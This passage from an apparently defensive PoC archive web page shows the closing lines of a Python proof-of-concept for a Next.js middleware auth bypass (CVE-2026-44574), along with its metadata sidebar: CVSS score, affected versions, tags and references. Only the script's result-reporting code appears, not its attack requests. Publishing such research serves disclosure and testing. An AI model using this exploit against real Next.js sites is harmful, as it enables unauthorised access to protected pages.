+</span></span><span class=line><span class=cl>              <span class=sa>f</span><span class=s2>&#34; protected slug body.</span><span class=si>{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>vuln</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=si>{</span><span class=n>R</span><span class=si>}</span><span class=s2>&gt;&gt;&gt; RESULT: PASS (vulnerability reproduced) &lt;&lt;&lt;</span><span class=si>{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  </span><span class=si>{</span><span class=n>G</span><span class=si>}</span><span class=s2>v PATCHED — neither arm reached the protected page.</span><span class=si>{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=si>{</span><span class=n>G</span><span class=si>}</span><span class=s2>&gt;&gt;&gt; RESULT: FAIL (target appears patched &gt;= v16.2.5) &lt;&lt;&lt;</span><span class=si>{</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div></div></div><nav class="mt-12 grid grid-cols-1 gap-3 border-t border-zinc-200 pt-6 sm:grid-cols-2 dark:border-zinc-800"><a href=/pocs/web/2026-05-17_nextjs-i18n-middleware-bypass/ class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-zinc-800"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">← previous in web</span>
+<span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">Next.js i18n Middleware Bypass (CVE-2026-44573)</span>
+</a><a href=/pocs/web/2026-05-17_nextjs-csp-nonce-cache-poisoned-xss/ class="group rounded-lg border border-zinc-200 p-3 text-right transition hover:border-emerald-400 dark:border-zinc-800"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">next in web →</span>
+<span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">Next.js CSP Nonce Cache-Poisoned XSS (CVE-2026-44581)</span></a></nav></div><aside class="hidden lg:order-2 lg:block"><div class="sticky top-20"><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-zinc-800 dark:bg-zinc-900/40"><div><div class="flex items-baseline justify-between"><span class="font-mono text-xs uppercase tracking-wide text-zinc-500 dark:text-zinc-400">CVSS</span>
+<span class="font-mono text-lg font-semibold text-orange-500 dark:text-orange-400">8.1<span class="text-xs text-zinc-400 dark:text-zinc-600">/10</span></span></div><div class="mt-1.5 h-1.5 w-full overflow-hidden rounded-full bg-zinc-200 dark:bg-zinc-800"><div class="h-full rounded-full bg-orange-500" style=width:81%></div></div></div><dl class="space-y-3 font-mono text-xs"><div><dt class="text-zinc-500 dark:text-zinc-400">Severity</dt><dd class=mt-1><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-orange-500/40 bg-orange-500/10 text-orange-500 dark:text-orange-400"><span class="h-1.5 w-1.5 rounded-full bg-current"></span>High</span></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">CVE</dt><dd class="mt-1 text-emerald-600 dark:text-emerald-400">CVE-2026-44574</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Category</dt><dd class=mt-1><a href=/pocs/web/ class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">web</a></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">Next.js App Router with dynamic route segments and middleware-based access control</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">Next.js 15.4.0 - 15.5.15 and 16.0.0 - 16.2.4</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-05-17</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt><dd class=mt-1><span class="text-amber-600 dark:text-amber-400">unpatched</span></dd></div></dl><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p><div class="mt-2 flex flex-wrap gap-1.5"><a href=/tags/auth-bypass/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#auth-bypass</a>
+<a href=/tags/dynamic-route/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#dynamic-route</a>
+<a href=/tags/nxtp-injection/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#nxtP-injection</a>
+<a href=/tags/middleware-bypass/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#middleware-bypass</a>
+<a href=/tags/param-smuggling/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#param-smuggling</a>
+<a href=/tags/next.js/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#Next.js</a>
+<a href=/tags/app-router/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#App-Router</a>
+<a href=/tags/unauthenticated/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#unauthenticated</a></div></div><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p><ul class="mt-2 space-y-1.5"><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://nvd.nist.gov/vuln/detail/CVE-2026-44574 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://nvd.nist.gov/vuln/detail/CVE-2026-44574</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/vercel/next.js/security/advisories/GHSA-492v-c6pp-mqqv target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/vercel/next.js/security/advisories/GHSA-492v-c6pp-mqqv</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/vercel/next.js/commit/f1c11203d5 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/vercel/next.js/commit/f1c11203d5</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/dwisiswant0/next-16.2.4-pocs target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/dwisiswant0/next-16.2.4-pocs</a></li></ul></div><div class="border-t border-zinc-200 pt-4 dark:border-zinc-800"><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p><a href=https://github.com/intelseclab/poc-archive/tree/master/pocs/web/2026-05-17_nextjs-dynamic-route-injection-auth-bypass/ target=_blank rel="noopener noreferrer" class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400"><svg class="h-3.5 w-3.5 flex-shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37.0.0 5.37.0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57.0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925.0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18.0.0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225.0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22.0 1.605-.015 2.895-.015 3.3.0.315.225.69.825.57A12.02 12.02.0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+intelseclab/poc-archive</a></div></div></div></aside></article></main><footer class="mt-16 border-t border-zinc-200 dark:border-zinc-800"><div class="mx-auto flex w-full max-w-6xl flex-col gap-2 px-4 py-8 text-xs text-zinc-500 sm:flex-row sm:items-center sm:justify-between sm:px-6 lg:px-8 dark:text-zinc-500"><p class=font-mono>PoC Archive — research artifacts for defensive and educational use only.</p><p class=font-mono>built with <a href=https://gohugo.io class="text-emerald-600 hover:underline dark:text-emerald-400">hugo</a> · deployed on github pages</p></div></footer></body></html>
